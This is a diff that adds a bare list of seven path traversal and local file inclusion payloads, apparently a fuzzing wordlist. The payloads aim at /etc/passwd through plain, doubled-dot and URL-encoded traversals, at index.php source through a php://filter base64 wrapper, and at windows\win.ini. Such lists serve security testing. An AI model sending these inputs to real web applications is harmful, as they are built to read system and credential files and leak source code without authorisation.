@@ -1,0 +1,7 @@
+../../../../etc/passwd
+../../../../../../etc/passwd
+....//....//....//etc/passwd
+/etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+php://filter/convert.base64-encode/resource=index.php
+..\..\..\..\windows\win.ini
